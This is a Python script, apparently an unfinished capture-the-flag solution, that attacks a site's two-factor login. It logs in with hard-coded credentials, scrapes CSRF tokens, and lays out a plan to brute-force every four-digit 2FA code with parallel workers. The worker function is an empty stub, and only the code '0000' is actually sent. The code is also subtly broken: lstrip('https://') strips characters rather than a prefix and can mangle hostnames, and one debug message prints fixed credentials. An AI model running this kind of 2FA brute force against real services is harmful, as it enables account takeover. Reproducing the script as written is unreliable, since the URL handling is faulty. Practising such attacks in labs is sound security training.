import sys

import requests
from bs4 import BeautifulSoup

# Const that enables / disables noisy prints made throughout program execution.
DEBUG_MODE = True


# Small wrapper for printing based on value of DEBUG_MODE
def debug_print(text):
    if DEBUG_MODE:
        print(text)


# Login to user we have credentials for.
def login(uname, pw, csrf_token):
    login_data = {
        'csrf': csrf_token,
        'username': uname,
        'password': pw
    }
    debug_print(f'Logging in as carlos:montoya')
    response = s.post(login_url, data=login_data)
    debug_print(f'Login response: {response.text}')
    return response.text


# Use BeautifulSoup's html parser to grab the csrf token from some html string
def parse_tree_for_csrf(text):
    parser = BeautifulSoup(text, 'html.parser')
    return parser.find('input', {'name': 'csrf'}).get('value')


# Start script
# ------------------------

# Pull site info from cli args -- drop https:// if included
try:
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
    raise IndexError("Missing ctf site url in command line arguments.\n")

# First:
# GET login page to find value of cross-site request forgery token.
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
csrf = parse_tree_for_csrf(resp.text)

# Plan

# 0 - 9999 possible 2fa codes
# n number of worker processes
# 10,000 / n codes to check per worker
# Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)

# Each worker will get it's own csrf token w/ logging in, so don't need to worry about an overall 2 attempt counter.
# So the process, per worker, will be: login, get csrf, try 2 codes (check each time if 2fa code is right), repeat.

# Each call to the function that carries out one functional unit of the above process (2fa attempt) will
# return a dict containing the status, and 2fa code, for that attempt. That way it will be easier to filter
# out bad codes based on status in the end.

# STARTING HERE WE NEED TO LOGIN EVERY TWO TIMES


def try_2fa_functional_unit():
    pass


# Then: Grab response after successful login to grab the csrf token for interaction with 2fa login page
#       Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
response_text = login('carlos', 'montoya', csrf)
csrf = parse_tree_for_csrf(response_text)

# Send auth request to 2fa endpoint with csrf token and '0000'
# Here's where we can split multiple processes that will all call a function
# that makes this post with a different 4-digit code each time.
login2_url = f'https://{site}/login2'
login2data = {
    'csrf': csrf,
    'mfa-code': str(0).zfill(4)
}
resp = s.post(login2_url, data=login2data, allow_redirects=False)
if resp.status_code == 302:
    print(f'2fa valid with response code {resp.status_code}')
    # Visit account profile page to complete level
else:
    debug_print(f'2fa invalid with response code: {resp.status_code}')
